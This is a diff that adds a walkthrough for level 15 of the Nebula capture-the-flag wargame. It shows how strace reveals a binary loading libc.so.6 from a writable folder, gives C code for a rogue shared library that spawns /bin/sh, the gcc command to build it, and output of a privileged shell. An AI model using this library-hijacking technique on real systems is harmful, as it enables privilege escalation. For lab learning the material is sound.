@@ -312,9 +312,27 @@ Plaintext: 8457c118-887c-4e40-a5a6-33a25353165
 ```
 
 
-## nn
+## 15
+Here, the hint tells you to 'strace' the flag15 executable, which will show that it's trying to load libc.so.6 from various folders below '/var/tmp/flag15' before it eventuallt loads it from the system folder.
+To exploit this, the technique is to create your own library there such that it will get loaded, at which point you have execution.
+```c
+#include <stdlib.h>
+void __attribute__ ((constructor)) myinit() {
+  system("/bin/sh");
+}
+```
+The above will suffice, but the trick is to be able to compile something that will be loaded instead of the normal libc, and run enough to provide the privalidged shell
 ```console
-
+gcc -fPIC  -o libc.so mylibc.c  -shared -static-libgcc -Wl,-static
+```
+With that, you might get a warning, but you also get execution...
+```console
+level15@nebula:~$ ../flag15/flag15
+../flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by ../flag15/flag15)
+sh-4.2$ whoami
+flag15
+sh-4.2$ getflag
+You have successfully executed getflag on a target account
 ```
 
 ## nn
